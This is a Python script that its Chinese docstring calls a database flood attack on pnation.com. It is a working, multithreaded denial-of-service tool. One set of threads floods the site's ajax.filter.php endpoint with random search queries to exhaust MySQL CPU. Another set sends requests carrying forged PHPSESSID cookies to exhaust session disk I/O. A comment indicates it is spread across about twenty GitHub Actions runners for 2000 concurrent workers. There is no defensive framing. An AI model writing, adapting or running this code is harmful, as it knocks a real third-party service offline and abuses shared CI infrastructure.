#!/usr/bin/env python3
"""PNATION 数据库洪水攻击：ajax.filter.php + Session洪水 双重打击"""
import urllib.request, sys, os, time, threading, random, ssl, string

TARGET = "https://pnation.com"
DB_ENDPOINT = f"{TARGET}/bbs/ajax.filter.php"
DURATION = 1500  # 25 minutes
BO_TABLES = ["multimedia", "audition", "news"]

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

def random_str(k=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=k))

def attack():
    running = [True]
    stats = {"db_ok": 0, "db_err": 0, "sess_ok": 0, "sess_err": 0}
    lock = threading.Lock()

    def db_flood():
        """Path 1: AJAX filter - MySQL CPU flood"""
        while running[0]:
            try:
                data = f"bo_table={random.choice(BO_TABLES)}&filter=title&stx={random_str(6)}".encode()
                req = urllib.request.Request(DB_ENDPOINT, data=data)
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
                req.add_header("User-Agent", f"Mozilla/5.0-{random.randint(1,999)}")
                resp = urllib.request.urlopen(req, timeout=10, context=ssl_ctx)
                resp.read()
                with lock:
                    stats["db_ok"] += 1
            except:
                with lock:
                    stats["db_err"] += 1

    def session_flood():
        """Path 3: Session creation - disk IO flood"""
        while running[0]:
            try:
                req = urllib.request.Request(TARGET)
                req.add_header("User-Agent", f"SessionFlood-{random.randint(1,99999)}")
                req.add_header("Cookie", f"PHPSESSID=flood_{random_str(20)}_{random.randint(0,999999)}")
                resp = urllib.request.urlopen(req, timeout=10, context=ssl_ctx)
                resp.read()
                with lock:
                    stats["sess_ok"] += 1
            except:
                with lock:
                    stats["sess_err"] += 1

    # 40 DB + 60 Session per node = 100 threads × 20 nodes = 2000 concurrent
    for _ in range(40):
        threading.Thread(target=db_flood, daemon=True).start()
    for _ in range(60):
        threading.Thread(target=session_flood, daemon=True).start()

    start = time.time()
    node = os.environ.get("GITHUB_RUN_ID", "unknown")
    print(f"[PNATION DB FLOOD] Run={node} | 100 workers | {DURATION}s | {time.strftime('%H:%M:%S')}")

    next_report = start + 120
    while time.time() - start < DURATION:
        time.sleep(15)
        if time.time() >= next_report:
            elapsed = time.time() - start
            with lock:
                s = dict(stats)
            total = s["db_ok"] + s["sess_ok"]
            print(f"  [{elapsed/60:.0f}m] DB={s['db_ok']}/{s['db_err']} Session={s['sess_ok']}/{s['sess_err']} Total={total}")
            next_report += 120

    running[0] = False
    elapsed = time.time() - start
    with lock:
        s = dict(stats)
    total = s["db_ok"] + s["sess_ok"]
    print(f"DONE: {total} requests ({s['db_ok']}+{s['sess_ok']}) in {elapsed:.0f}s")

if __name__ == "__main__":
    attack()
